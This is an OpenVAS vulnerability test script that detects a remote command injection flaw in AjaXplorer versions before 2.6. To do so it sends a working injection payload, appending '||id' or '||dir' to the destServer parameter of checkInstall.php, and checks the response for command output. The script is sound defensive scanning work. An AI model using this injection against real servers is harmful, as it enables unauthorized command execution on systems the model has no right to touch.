###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_AjaXplorer_39334.nasl 14 2013-10-27 12:33:37Z jan $
#
# AjaXplorer Remote Command Injection and Local File Disclosure Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "AjaXplorer is prone to a remote command injection vulnerability and a
local file disclosure vulnerability because it fails to adequately
sanitize user-supplied input data.

Attackers can exploit this issue to execute arbitrary commands within
the context of the affected application and to obtain potentially
sensitive information from local files on computers running the
vulnerable application. This may aid in further attacks.

Versions prior to AjaXplorer 2.6 are vulnerable.";

tag_solution = "Updates are available. Please see the references for more information.";

if (description)
{
 script_id(100574);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-04-13 13:16:59 +0200 (Tue, 13 Apr 2010)");
 script_bugtraq_id(39334);
 script_tag(name:"cvss_base", value:"5.1");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
 script_name("AjaXplorer Remote Command Injection and Local File Disclosure Vulnerabilities");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/39334");
 script_xref(name : "URL" , value : "http://www.ajaxplorer.info/wordpress/2010/04/ajaxplorer-2-6-security-ajaxplorer-2-7-1-early-beta-for-3-0/");
 script_xref(name : "URL" , value : "http://www.ajaxplorer.info");

 script_tag(name:"risk_factor", value:"High");
 script_description(desc);
 script_summary("Determine if AjaXplorer is prone to a remote command injection vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("gb_AjaXplorer_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("AjaXplorer/installed");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

if(!dir = get_dir_from_kb(port:port,app:"AjaXplorer"))exit(0);
cmds = make_array("uid=[0-9]+.*gid=[0-9]+","id","<dir>","dir");

foreach cmd (keys(cmds)) {

  url = string(dir,"/plugins/access.ssh/checkInstall.php?destServer=||",cmds[cmd]); 

  if(http_vuln_check(port:port, url:url,pattern:cmd)) {
     
    security_hole(port:port);
    exit(0);

  }
}

exit(0);

